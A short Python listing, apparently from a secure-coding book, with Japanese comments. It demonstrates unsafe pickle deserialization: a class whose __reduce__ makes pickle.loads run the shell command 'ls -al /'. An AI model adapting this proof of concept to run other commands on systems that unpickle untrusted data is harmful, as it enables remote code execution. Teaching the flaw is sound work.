#!/usr/bin/env python
# Code Listing #6

"""

Code exposing unsafe pickling of objects via a shell exploit

"""

import os
import pickle


class ShellExploit:
    """ A shell exploit class """

    # 急所はこの __reduce__() にある
    def __reduce__(self):
        # this will list contents of root / folder.
        return (os.system, ('ls -al /',))


def serialize():
    # ShellExploit オブジェクトをバイナリー化
    shellcode = pickle.dumps(ShellExploit())
    return shellcode


def deserialize(exploit_code):
    # 返り値は無視する
    pickle.loads(exploit_code)

# 実行すると Cygwin なら C:\cygwin64 の中身が出力する
if __name__ == '__main__':
    shellcode = serialize()
    deserialize(shellcode)
